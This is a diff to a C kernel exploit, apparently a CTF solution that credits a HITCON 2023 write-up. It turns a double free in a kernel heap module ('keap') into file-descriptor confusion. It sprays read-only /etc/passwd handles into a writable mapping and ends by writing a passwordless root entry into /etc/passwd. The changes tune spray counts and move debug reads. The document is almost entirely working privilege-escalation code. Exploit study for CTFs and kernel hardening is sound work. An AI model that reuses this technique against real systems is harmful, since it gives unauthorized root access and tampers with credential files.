@@ -1,8 +1,9 @@
 #include <unistd.h>
 #include "libs/pwn.h"
 
-#define FS_CONTEXT_SIZE 256
-#define NUM_SPRAY_FDS 0x300
+#define FS_CONTEXT_SLAB_SIZE 256
+#define NUM_SPRAY_FDS 0x20
+#define PASSWD_SPRAY_FDS 0xc00
 
 /*
  * inspired by https://chovid99.github.io/posts/hitcon-ctf-2023/
@@ -14,7 +15,7 @@ int main(void)
   int tmp_a;
   int freed_fd = -1;
   void* keap_ptr;
-  char buf[FS_CONTEXT_SIZE];
+  char buf[FS_CONTEXT_SLAB_SIZE];
   bzero(buf, sizeof(buf));
 
   puts("[+] Initial setup");
@@ -31,7 +32,7 @@ int main(void)
   SYSCHK(close(tmp_a));
 
   puts("[+] create and free heap allocation for double free later");
-  keap_ptr = keap_malloc(FS_CONTEXT_SIZE, GFP_KERNEL_ACCOUNT);
+  keap_ptr = keap_malloc(FS_CONTEXT_SLAB_SIZE, GFP_KERNEL_ACCOUNT);
 
   keap_free(keap_ptr);
   // spray 
@@ -54,9 +55,9 @@ int main(void)
   }
 
   puts("[+] Free one of the FDs via double free keap");
-  keap_read(buf, keap_ptr, FS_CONTEXT_SIZE);
   #ifdef DEBUG
-  print_hex(buf, FS_CONTEXT_SIZE); 
+  keap_read(buf, keap_ptr, FS_CONTEXT_SLAB_SIZE);
+  print_hex(buf, FS_CONTEXT_SLAB_SIZE); 
   #endif
   keap_free(keap_ptr);
   // After: 1 fd but pointed chunk is free
@@ -81,9 +82,9 @@ int main(void)
     }
   }
 
-  keap_read(buf, keap_ptr, FS_CONTEXT_SIZE);
   #ifdef DEBUG
-  print_hex(buf, FS_CONTEXT_SIZE); 
+  keap_read(buf, keap_ptr, FS_CONTEXT_SLAB_SIZE);
+  print_hex(buf, FS_CONTEXT_SLAB_SIZE); 
   #endif
 
   if (freed_fd == -1) {
@@ -105,13 +106,14 @@ int main(void)
   // After: 1 fd 0 refcount (Because new file)
   // Effect: FD in mmap (which is writeable) can be replaced with RDONLY file
 
-  for (int i = 0; i < NUM_SPRAY_FDS; i++) {
-      spray_fds[i] = open("/etc/passwd", O_RDONLY);
+  int passwd_fds[PASSWD_SPRAY_FDS];
+  for (int i = 0; i < PASSWD_SPRAY_FDS; i++) {
+      passwd_fds[i] = open("/etc/passwd", O_RDONLY);
   }
   // After: 2 fd 1 refcount (but writeable due to mmap)
-  keap_read(buf, keap_ptr, FS_CONTEXT_SIZE);
   #ifdef DEBUG
-  print_hex(buf, FS_CONTEXT_SIZE); 
+  keap_read(buf, keap_ptr, FS_CONTEXT_SLAB_SIZE);
+  print_hex(buf, FS_CONTEXT_SLAB_SIZE); 
   #endif
 
   strcpy(file_mmap, "root::0:0:root:/root:/bin/sh\n");
